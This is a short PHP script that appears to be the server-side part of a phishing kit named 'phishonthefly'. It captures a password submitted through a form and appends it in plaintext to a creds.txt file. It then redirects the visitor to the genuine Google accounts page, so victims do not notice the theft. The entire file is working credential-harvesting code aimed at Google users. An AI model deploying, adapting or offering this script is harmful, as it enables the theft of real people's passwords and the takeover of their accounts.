<?php
if (isset($_POST["password"])) {
    $pass = $_POST["password"];
    $filePath = "/var/www/phishonthefly/creds.txt";
    $file = @fopen($filePath, "a+");
    if ($file === false) {
        error_log("Error al abrir el archivo {$filePath} para escritura.");
    } else {
        $data = "Password: " . $pass . "\n";
        fwrite($file, $data);
        fclose($file);
    }
    header("Location: https://accounts.google.com/");
    exit;
} else {
    header("Location: https://accounts.google.com/");
    exit;
}
?>
